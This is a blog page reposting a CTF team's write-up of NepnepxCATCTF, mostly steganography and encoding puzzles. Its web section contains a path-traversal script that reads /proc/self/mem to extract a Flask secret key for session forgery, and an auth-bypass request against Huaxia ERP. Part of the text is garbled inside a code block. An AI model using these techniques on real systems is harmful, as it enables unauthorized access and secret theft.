@@ -1,0 +1,272 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>NepnepxCATCTF 部分 WriteUp (MISC 6 题速查) | PUDONG LAB</title><meta name="author" content="朴冬,2559874620@qq.com/tyjiang@stu.xjtu.edu.cn"><meta name="copyright" content="朴冬"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="NepnepxCATCTF 部分 WriteUp: 6 道 MISC 速查 (vmdk flag 搜索 &#x2F; QQ 空间 OSINT &#x2F; DeepSound 兽语 &#x2F; rabbit+Ook 编码 &#x2F; png 隐藏)。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NepnepxCATCTF 部分 WriteUp (MISC 6 题速查)">
+<meta property="og:url" content="https://pudong617.github.io/2023/01/01/ctf-kb/wp/Misc/NepnepxCATCTF%E9%83%A8%E5%88%86WriteUp/">
+<meta property="og:site_name" content="PUDONG LAB">
+<meta property="og:description" content="NepnepxCATCTF 部分 WriteUp: 6 道 MISC 速查 (vmdk flag 搜索 &#x2F; QQ 空间 OSINT &#x2F; DeepSound 兽语 &#x2F; rabbit+Ook 编码 &#x2F; png 隐藏)。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pudong617.github.io/img/youli.png">
+<meta property="article:published_time" content="2022-12-31T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-12-31T16:00:00.000Z">
+<meta property="article:author" content="朴冬">
+<meta property="article:tag" content="vmdk flag 搜索">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pudong617.github.io/img/youli.png"><link rel="shortcut icon" href="/img/PU-LOGO.png"><link rel="canonical" href="https://pudong617.github.io/2023/01/01/ctf-kb/wp/Misc/NepnepxCATCTF%E9%83%A8%E5%88%86WriteUp/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'NepnepxCATCTF 部分 WriteUp (MISC 6 题速查)',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-01-01 00:00:00'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><style>
+  /* 冷色极光渐变背景：与主题主色 #49B1F5 / #00C4B6 同色系 */
+  html #web_bg {
+    background-color: #F5FAFF;
+    background-image:
+      radial-gradient(1200px 700px at 12% -10%, rgba(73, 177, 245, .55), transparent 60%),
+      radial-gradient(1000px 650px at 92% 15%, rgba(0, 196, 182, .40), transparent 60%),
+      radial-gradient(900px 560px at 68% 108%, rgba(255, 114, 66, .16), transparent 62%),
+      linear-gradient(155deg, #E3F2FF 0%, #F6FBFF 45%, #E4F8F2 100%);
+  }
+  /* 暗色模式：同构图，降低光斑强度 */
+  html[data-theme='dark'] #web_bg {
+    background-color: #0B121A;
+    background-image:
+      radial-gradient(1100px 700px at 10% -8%, rgba(73, 177, 245, .45), transparent 62%),
+      radial-gradient(1000px 620px at 92% 12%, rgba(0, 196, 182, .32), transparent 62%),
+      radial-gradient(800px 520px at 72% 105%, rgba(255, 114, 66, .10), transparent 60%),
+      linear-gradient(160deg, #0B121A 0%, #0C1A24 50%, #0A1E20 100%);
+  }
+</style>
+<link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/youli.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">1050</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">879</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 分享</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> LINK</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background: radial-gradient(1100px 620px at 18% 8%, rgba(73, 177, 245, .55), transparent 60%), radial-gradient(900px 520px at 82% 22%, rgba(0, 196, 182, .45), transparent 62%), radial-gradient(700px 460px at 55% 108%, rgba(255, 114, 66, .18), transparent 60%), linear-gradient(155deg, #0A1A2B 0%, #0E3049 48%, #083F45 100%)"><nav id="nav"><span id="blog-info"><a href="/" title="PUDONG LAB"><img class="site-icon" src="/img/pudong.png"/></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 分享</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> LINK</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">NepnepxCATCTF 部分 WriteUp (MISC 6 题速查)</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-12-31T16:00:00.000Z" title="发表于 2023-01-01 00:00:00">2023-01-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-12-31T16:00:00.000Z" title="更新于 2023-01-01 00:00:00">2023-01-01</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/">CTF知识库</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/WP/">WP</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/Misc/">Misc</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="NepnepxCATCTF 部分 WriteUp (MISC 6 题速查)"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
+<p>原文: <a target="_blank" rel="noopener" href="https://www.ctfiot.com/89555.html">https://www.ctfiot.com/89555.html</a><br>ID: 89555</p>
+</blockquote>
+<p>喜迎元旦      携手启航2023</p>
+<p>在这辞旧迎新的时刻，天权信安网络安全团队向所有关心并支持天权信安发展的网安人，致以新年的问候和诚挚的祝福！</p>
+<p>MISC</p>
+<p>01</p>
+<p>.Cat_Jump</p>
+<p>因为是vmdk文件，所以直接用十六进制编辑器打开搜索CatCTF{</p>
+<p>找到flag:</p>
+<p>FLAG：CatCTF{EFI_1sv3ry_funn9}</p>
+<p>02</p>
+<p>.Peekaboo</p>
+<p>在图片尾部找到QQ号，访问空间</p>
+<p>直接登录王者上号搜索：</p>
+<p>发现当前赛季仅使用过打野英雄游戏，查看一下打野英雄的数据</p>
+<p>只用过三名英雄，查看一下各英雄的详细数据（PS：此时已经可以开始试flag了）</p>
+<p>查看发现最后使用的英雄为百里玄策，所以flag为CatCTF{bailixuance}</p>
+<p>FLAG：CatCTF{bailixuance}</p>
+<p>03</p>
+<p>.miao~</p>
+<p>jpg文件尾部找到一个wav文件：</p>
+<p>手动分离出来，放入audacity工具中：</p>
+<p>查看频谱图</p>
+<p>推测是一个密码，一番尝试后发现需要使用DeepSound工具解密</p>
+<p>输入密码CatCTF</p>
+<p>得到flag.txt，打开</p>
+<p>兽语密码，使用<a target="_blank" rel="noopener" href="http://hi.pcmoe.net/roar.html%E5%9C%A8%E7%BA%BF%E8%A7%A3%E5%AF%86">http://hi.pcmoe.net/roar.html在线解密</a></p>
+<p>解密得到flag</p>
+<p>FLAG：CatCTF{d0_y0u_Hate_c4t_ba3k1ng_?_M1ao~}</p>
+<p>04.CatCat</p>
+<p>首先看到txt文件：</p>
+<p>根据文件名推测为rabbit，使用</p>
+<p><a target="_blank" rel="noopener" href="https://www.sojson.com/encrypt_rabbit.html%E5%9C%A8%E7%BA%BF%E8%A7%A3%E5%AF%86">https://www.sojson.com/encrypt_rabbit.html在线解密</a></p>
+<p>解密失败，推测需要密码，查看jpg文件</p>
+<p>图片显示明显有问题，推测是因为插入数据导致图片受损，用010Edior打开jpg文件，搜索password</p>
+<p>得到密码catflag，再次使用网站在线解密rabbit</p>
+<p>根据文件名可以知道解出的内容应该是base91编码，使用解码工具解密</p>
+<p>观察发现具有Ook密码特征，将cat替换为Ook后使用</p>
+<p><a target="_blank" rel="noopener" href="https://www.splitbrain.org/services/ook%E5%9C%A8%E7%BA%BF%E8%A7%A3%E5%AF%86">https://www.splitbrain.org/services/ook在线解密</a></p>
+<p>解得flag：CATCTF{Th1s_V3ry_cute_catcat!!!}，</p>
+<p>将CATCTF改为CatCTF</p>
+<p>提交FLAG：CatCTF{Th1s_V3ry_cute_catcat!!!}</p>
+<p>05.MeowMeow</p>
+<p>打开readme.md</p>
+<p>根据md文件推测需要从png文件中找到三段密文，使用010Editor打开png文件，拖到底部</p>
+<p>右侧缩略图看到疑似图案</p>
+<p>根据md文件内容及观察得到flag：CatCTF{CAT_GOES_MEOW}。</p>
+<p>（PS：C与G的区别是G明显有一提）</p>
+<p>FLAG：CatCTF{CAT_GOES_MEOW}</p>
+<p>06.CatchCat</p>
+<p>看到一大堆坐标根据经验推测flag为坐标轨迹，将经纬度从txt文件中手动提取出来后作坐标使用Python绘图</p>
+<p>exp:<br>import matplotlib.pyplot as pltimport numpy as npx, y &#x3D; np.loadtxt(‘flag.txt’, delimiter&#x3D;’,’, unpack&#x3D;True)plt.plot(x, y, ‘.’)plt.show()</p>
+<p>flag.txt:</p>
+<p>执行得到</p>
+<p>貌似右边为反转后的C，那么左边为反转后的}，使用Python对图像镜像反转</p>
+<p>exp：from PIL import Imageim &#x3D; Image.open(“1.png”)pim &#x3D; im.load()an &#x3D; Image.open(“1.png”)ans &#x3D; an.load()for i in range(im.size[0]): for j in range(im.size[1]): ans[i, j] &#x3D; pim[-i-1, j]an.show()</p>
+<p>执行</p>
+<p>勉强可以看出有CatCTF{}字样，根据轨迹手绘后得到</p>
+<p>NMEA在线网站<a target="_blank" rel="noopener" href="https://mygeodata.cloud/converter/nmea-to-kml">https://mygeodata.cloud/converter/nmea-to-kml</a></p>
+<p>这个1让我错失一血。。。</p>
+<p>画出flag：CatCTF{GPS_M1ao}FLAG：CatCTF{GPS_M1ao}</p>
+<p>07.Nepnep祝你新年快乐啦！</p>
+<p>视频最后一帧：</p>
+<p>08.CatFlag</p>
+<p>cat flag：</p>
+<p>FLAG：CatCTF{!2023_Will_Be_Special,2022_Was_Not!}</p>
+<p>09.CatPaw</p>
+<p>小米备份文件，可以用7zip打开得到apk，对apk进行分析，跳转到加密代码</p>
+<p>通过分析代码，发现只需要最后的md5值和8b9b0ad9c324204fac87ae0fc2c630bd相等即可</p>
+<p>同时资源中又发现password必须大于5位</p>
+<p>在so中发现读取&#x2F;dev&#x2F;input&#x2F;event1并保存在应用目录下</p>
+<p>备份文件中的数据文件就是保存下来的输入数据</p>
+<p>利用命令即可模拟输入</p>
+<p>一次输入是CatC，大概是因为输入的时候报错了，我的手机并不是小米手机，只是刷了MIUI系统，可能是这个原因导致报错，没有全部输入完成</p>
+<p>WEB</p>
+<p>01.ez_js</p>
+<p>F12查看调试器，在js&#x2F;game.js中搜索flag</p>
+<p>找到flag的地址，访问</p>
+<p>得到flag</p>
+<p>FLAG：flag{7s_g4m3_ju5t_f1nd_1t}</p>
+<p>02.catcat</p>
+<p>跟2022蓝帽杯的<code>file_session</code>存在一样的考点<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzkyNDA5NjgyMg==&mid=2247493655&idx=1&sn=2eafc10949807487d993882220d05271&chksm=c1d9a84ef6ae2158dac0f1e00fc04efd4e8a0966e16aaaf7a1c00e46ff1fa97b5f574d051721&mpshare=1&scene=23&srcid=07134xssC34Apm45RHto6pPS&sharer_sharetime=1657706356282&sharer_shareid=bc030b6a5149970738c6328966d9421d#rd">公众号</a></p>
+<p>在<code>http://223.112.5.156: 54007/info?file=../app.py</code>存在任意文件读取</p>
+<p>查看app.py源码</p>
+<figure class="highlight plaintext"><figcaption><span>osimport uuid</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, request, session, render_template, Markup</span><br><span class="line">from cat import catflag = &quot;&quot;app = Flask( __name__, static_url_path=&#x27;/&#x27;, static_folder=&#x27;static&#x27; )app.config[&#x27;SECRET_KEY&#x27;] = str(uuid.uuid4()).replace(&quot;-&quot;, &quot;&quot;) + &quot;*abcdefgh&quot;if os.path.isfile(&quot;/flag&quot;): flag = cat(&quot;/flag&quot;) os.remove(&quot;/flag&quot;)@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;])def index(): detailtxt = os.listdir(&#x27;./details/&#x27;) cats_list = [] for i in detailtxt: cats_list.append(i[:i.index(&#x27;.&#x27;)]) return render_template(&quot;index.html&quot;, cats_list=cats_list, cat=cat)@app.route(&#x27;/info&#x27;, methods=[&quot;GET&quot;, &#x27;POST&#x27;])def info(): filename = &quot;./details/&quot; + request.args.get(&#x27;file&#x27;, &quot;&quot;) start = request.args.get(&#x27;start&#x27;, &quot;0&quot;) end = request.args.get(&#x27;end&#x27;, &quot;0&quot;) name = request.args.get(&#x27;file&#x27;, &quot;&quot;)[:</span><br><span class="line">request.args.get(&#x27;file&#x27;, &quot;&quot;).index(&#x27;.&#x27;)] return render_template(&quot;detail.html&quot;, catname=name, info=cat(filename, start, end))@app.route(&#x27;/admin&#x27;, methods=[&quot;GET&quot;])def admin_can_list_root(): if session.get(&#x27;admin&#x27;) == 1: return flag else: session[&#x27;admin&#x27;] = 0 return &quot;NoNoNo&quot;if __name__ == &#x27;__main__&#x27;: app.run(host=&#x27;0.0.0.0&#x27;, debug=False, port=5637)&#x27;```</span><br><span class="line"></span><br><span class="line">发现他对`/flag`调用了cat()后把flag删了，然后再看看cat.py</span><br><span class="line"></span><br><span class="line">cat.py```pyb&#x27;import os, sys, getopt</span><br><span class="line">def cat(filename, start=0, end=0)-&gt;bytes: data = b&#x27;&#x27; try: start = int(start) end = int(end) </span><br><span class="line">except: start=0 end=0 if filename != &quot;&quot; and os.access(filename, os.R_OK): f = open(filename, &quot;rb&quot;) if start &gt;= 0: f.seek(start) if end &gt;= start and end != 0: data = f.read(end-start) else: data = f.read() else: data = f.read() f.close() else: data = (&quot;File `%s` not exist or can not be read&quot; % filename).encode() return dataif __name__ == &#x27;__main__&#x27;: opts,args = getopt.getopt(sys.argv[1:],&#x27;-h-f:-s:-e:&#x27;,[&#x27;help&#x27;,&#x27;file=&#x27;,&#x27;start=&#x27;,&#x27;end=&#x27;]) fileName = &quot;&quot; start = 0 end = 0 for opt_name, opt_value in opts: if opt_name == &#x27;-h&#x27; or opt_name == &#x27;--help&#x27;: print(&quot;[*] Help&quot;) print(&quot;-f --file File name&quot;) print(&quot;-s --start Start position&quot;) print(&quot;-e --end End position&quot;) print(&quot;[*] Example of reading /etc/passwd&quot;) print(&quot;python3 cat.py -f /etc/passwd&quot;) print(&quot;python3 cat.py --file /etc/passwd&quot;) print(&quot;python3 cat.py -f /etc/passwd -s 1&quot;) print(&quot;python3 cat.py -f /etc/passwd -e 5&quot;) print(&quot;python3 cat.py -f /etc/passwd -s 1 -e 5&quot;) exit() elif opt_name == &#x27;-f&#x27; or opt_name == &#x27;--file&#x27;: fileName = opt_value elif opt_name == &#x27;-s&#x27; or opt_name == &#x27;--start&#x27;: start = opt_value elif opt_name == &#x27;-e&#x27; or opt_name == &#x27;--end&#x27;: end = opt_value if fileName != &quot;&quot;: print(cat(fileName, start, end)) else: print(&quot;No file to read&quot;)&#x27;```</span><br><span class="line"></span><br><span class="line">可以发现，这个函数是使用了seek来调整文件读取位置的</span><br><span class="line"></span><br><span class="line">因为python的对象都是存储在堆上的，所以先在`/proc/self/maps`上找到堆栈分布，找偏移量为0的（不知道为什么，反正是照着exp猜测的）</span><br><span class="line"></span><br><span class="line">然后在`/proc/self/mem`里通过对应的偏移量找key</span><br><span class="line"></span><br><span class="line">```pyimport requests, reurl = &quot;http://223.112.5.156:</span><br><span class="line">54007/&quot;maps_url = f&quot;&#123;url&#125;/info?file=../../../../../proc/self/maps&quot;#需要匹配的堆地址maps_reg = &quot;([a-z0-9]&#123;12&#125;-[a-z0-9]&#123;12&#125;) rw.*?00000000 00:00 0&quot;#从/proc/self/maps中匹配堆地址位置maps = re.findall(maps_reg, requests.get(maps_url).text)</span><br><span class="line"># print(maps)#从匹配到的结果一个个遍历读取for m in maps: start, end = m.split(&quot;-&quot;)[0], m.split(&quot;-&quot;)[1] start, end = str(int(start, 16)), str(int(end, 16)) read_url = f&quot;&#123;url&#125;/info?file=../../../../../proc/self/mem&amp;start=&#123;start&#125;&amp;end=&#123;end&#125;&quot; s = requests.get(read_url).content print(s) # 匹配的secret_key格式 rt = re.findall(b&quot;[a-z0-9]&#123;8&#125;[a-z0-9]&#123;4&#125;[a-z0-9]&#123;4&#125;[a-z0-9]&#123;4&#125;[a-z0-9]&#123;12&#125;*abcdefgh&quot;, s) if rt: print(rt)```</span><br><span class="line"></span><br><span class="line">得到key，伪造session，访问/admin，得到flag</span><br><span class="line"></span><br><span class="line">03.ezbypass</span><br><span class="line"></span><br><span class="line">华夏erp授权绕过</span><br><span class="line"></span><br><span class="line">参考[华夏ERP漏洞之授权绕过漏洞+后台命令执行漏洞=未授权命令执行](https://cn-sec.com/archives/387212.html)</span><br><span class="line"></span><br><span class="line">就是说url里存在</span><br><span class="line"></span><br><span class="line">```.css#.js#.jpg#.png#.gif#.ico```就不会进行认证，从而绕过登录payload```GET /a.css/../flag.html```</span><br><span class="line"></span><br><span class="line">需要在burp里传：</span><br><span class="line"></span><br><span class="line">Reverse</span><br><span class="line"></span><br><span class="line">01.The cat did it</span><br><span class="line"></span><br><span class="line">问题：我离开猫猫的概率是多少？</span><br><span class="line"></span><br><span class="line">然后给出了一堆公式</span><br><span class="line"></span><br><span class="line">因为是CatCTF所以我离开猫猫的概率是0%</span><br><span class="line"></span><br><span class="line">md5(0%) = 9f1ef07877f9d85a82bd500f408b4814</span><br><span class="line"></span><br><span class="line">FLAG：CatCTF&#123;9f1ef07877f9d85a82bd500f408b4814&#125;</span><br><span class="line"></span><br><span class="line">Crypto</span><br><span class="line"></span><br><span class="line">01.cat’s gift</span><br><span class="line"></span><br><span class="line">猫猫给的当然会是食物啦，但是鱼不对，看到下面的数学就想到了π，对应食物也就是派，所以flag是CatCTF&#123;pie&#125;</span><br><span class="line"></span><br><span class="line">总共4份就是π</span><br><span class="line"></span><br><span class="line">FLAG：CatCTF&#123;pie&#125;</span><br><span class="line"></span><br><span class="line">招新小广告</span><br><span class="line"></span><br><span class="line">2023年招新计划(主力/NMEGREZ)</span><br><span class="line"></span><br><span class="line">注：不限年龄与职业要求，只要不是纯小白(或者是初学者未参与过任何一场比赛的人)就有机会通过审核，天权信安对外长期招新，出色的师傅能够参与团队项目和竞赛项目建设。</span><br><span class="line"></span><br><span class="line">PWN：要求技术中等偏上（曾参与过省级/国家级网安赛事荣获过奖项的师傅优先考虑）</span><br><span class="line"></span><br><span class="line">REVERSE：要求技术中等（曾参与过省级/国家级网安赛事荣获过奖项的师傅优先考虑）</span><br><span class="line"></span><br><span class="line">CRYPTO：要求技术中等偏上</span><br><span class="line"></span><br><span class="line">WEB：要求技术中等偏上</span><br><span class="line"></span><br><span class="line">取证：曾参与过省级网安取证赛事荣获过奖项的师傅</span><br><span class="line"></span><br><span class="line">BLOCKCHAIN/IOT/工控/AI：要求技术中等</span><br><span class="line"></span><br><span class="line">CTF竞赛靶场/TQCTF练习平台运维师傅：若干名，熟悉docker操作、动态题目部署、以及常规运维，还具备组网部署经验和Linux、Windows系统部署和日常维护，能使靶场平台在各种环境中正常运行。</span><br><span class="line"></span><br><span class="line"> 欢迎联系：</span><br><span class="line"></span><br><span class="line">投递邮箱：megrez@megrezsec.cn（Evan师傅）</span><br><span class="line"></span><br><span class="line">–天权信安网络安全团队–</span><br><span class="line"></span><br><span class="line">网络无边 安全有界</span><br><span class="line"></span><br><span class="line">2022，感恩有您</span><br><span class="line"></span><br><span class="line">2023，携手同行</span><br><span class="line"></span><br><span class="line">用技术撬动未来，用奋斗描绘成功！</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>exp:<br>import matplotlib.pyplot as pltimport numpy as npx, y &#x3D; np.loadtxt(‘flag.txt’, delimiter&#x3D;’,’, unpack&#x3D;True)plt.plot(x, y, ‘.’)plt.show()<br>exp：from PIL import Imageim &#x3D; Image.open(“1.png”)pim &#x3D; im.load()an &#x3D; Image.open(“1.png”)ans &#x3D; an.load()for i in range(im.size[0]): for j in range(im.size[1]): ans[i, j] &#x3D; pim[-i-1, j]an.show()<br>画出flag：CatCTF{GPS_M1ao}FLAG：CatCTF{GPS_M1ao}</p>
